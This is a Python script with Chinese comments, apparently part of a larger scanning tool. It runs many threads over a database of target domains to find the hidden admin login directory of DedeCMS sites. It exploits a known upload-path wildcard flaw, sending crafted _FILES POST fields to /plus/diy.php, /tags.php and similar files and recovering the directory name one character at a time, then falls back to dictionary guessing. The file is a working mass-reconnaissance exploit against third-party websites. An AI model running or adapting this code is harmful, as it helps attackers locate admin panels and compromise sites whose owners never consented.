# -*- coding: utf-8 -*-
# 四、查找后台地址
#     status：
#         6：已找到
#         7：未找到 -----单独程序跑后台，找到改为6，失败改为8

import itertools
import traceback
from common import utils
from threading import Thread
import time
import re
from unit import dbsqlite

characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
base_back_dict = utils.get_lines("./dict/织梦后台字典.txt")


def try_common(domain):
    back_dir_dict = []
    s = domain.replace("http://", "").replace("https://", "")
    n = len(s.split("."))
    if n == 2:
        path = s.split(".")[0]
        back_dir_dict = [path, "admin_%s" % path, "dede_%s" % path, "ad_%s" % path, "bk_%s" % path,
                         "background_%s" % path, "houtai_%s" % path, "%s_admin" % path, "%s_dede" % path,
                         "%s_ad" % path, "%s_bk" % path, "%s_background" % path, "%s_houtai" % path]
    if n >= 3:
        for path in s.split(".")[:n - 1]:
            back_dir_dict = [path, "admin_%s" % path, "dede_%s" % path, "ad_%s" % path, "bk_%s" % path,
                             "background_%s" % path, "houtai_%s" % path, "%s_admin" % path, "%s_dede" % path,
                             "%s_ad" % path, "%s_bk" % path, "%s_background" % path, "%s_houtai" % path]
    back_dir_dict.extend(base_back_dict)
    for back_dir in back_dir_dict:
        print(domain + "/" + back_dir + "/login.php")
        res = utils.my_requests(domain + "/" + back_dir + "/login.php", try_count=2)
        if res and res.status_code == 200 and "login.php" in res.url:
            res = {"domain": domain, "res": True, "info": back_dir}
            return res
    pass


def get_back_url(domain):
    back_dir = ""
    flag = 0
    target_url = ""
    up_path = "./../{p}<</images/adminico.gif"
    data = {
        "_FILES[mochazz][tmp_name]": up_path,
        "_FILES[mochazz][name]": 0,
        "_FILES[mochazz][size]": 0,
        "_FILES[mochazz][type]": "image/gif"
    }
    site_files = ["/plus/diy.php", "/plus/list.php", "/plus/feedback.php", "/plus/count.php", "/tags.php"]
    try:
        for site_file_path in site_files:
            url = domain + site_file_path
            res = utils.my_requests(url)
            if res and res.status_code == 200:
                target_url = domain + site_file_path
                if site_file_path == "/tags.php":
                    up_path = "./{p}<</images/adminico.gif"
                    data.update({"_FILES[mochazz][tmp_name]": up_path})
                break
        else:
            res = {"domain": domain, "res": False, "info": "找不到上传路径"}
            return res
        for num in range(1, 3):
            if flag:
                break
            for pre in itertools.permutations(characters, num):
                pre = ''.join(list(pre))
                # if pre == "my":
                #     print("1")
                data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=pre)
                print("testing", pre)
                r = utils.my_requests(target_url, method="post", data=data)
                data["_FILES[mochazz][tmp_name]"] = up_path
                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                    flag = 1
                    back_dir = pre
                    break
        if not flag:
            res = {"domain": domain, "res": False, "info": "没找到"}
            return res
        print("[+] 前缀为：", back_dir)
        flag = 0
        for i in range(len(characters)):
            if flag:
                break
            for ch in characters:
                if back_dir == "aaaa":
                    res = {"domain": domain, "res": False, "info": "循环错误"}
                    return res
                if ch == characters[-1]:
                    flag = 1
                    break
                data["_FILES[mochazz][tmp_name]"] = data["_FILES[mochazz][tmp_name]"].format(p=back_dir + ch)
                r = utils.my_requests(target_url, method="post", data=data)
                data["_FILES[mochazz][tmp_name]"] = up_path
                if "Upload filetype not allow !" not in r.text and r.status_code == 200:
                    back_dir += ch
                    print("%s[+]" % domain, back_dir)
                    # print("后台地址为：", domain+"/"+back_dir)
                    break
        res = {"domain": domain, "res": True, "info": back_dir}
        print("后台地址为：", domain + "/" + back_dir)
        return res
    except Exception as e:
        traceback.print_exc()
        res = {"domain": domain, "res": False, "info": "未知错误"}
        return res


def task():
    while True:
        domain_model = dbsqlite.start_getlist(' status = 7 ')
        if not domain_model:
            print('线程：%d为查到符合条件数据,等待3s' % i)
            time.sleep(3)
            continue
        domain = domain_model[1]
        res = get_back_url(domain)
        if not res or not res["res"]:
            result = try_common(domain)
            if result['res']:
                status = 6
                des = result['res']
            else:
                status = 8
                des = result['res']
        else:
            if res["res"]:
                status = 6
                des = res['res']
            else:
                status = 8
                des = res['res']
        dbsqlite.data_update(domain_model[1], "status = %d,des = '%s'" % (status, des))


if __name__ == '__main__':
    # task()
    try:
        Threads = []
        for i in range(10):
            t = Thread(target=task, args=(i,))
            t.daemon = 1
            Threads.append(t)
            t.start()
        # 启动所有线程
        for i in Threads:
            i.join()
    except Exception as e:
        print(e)
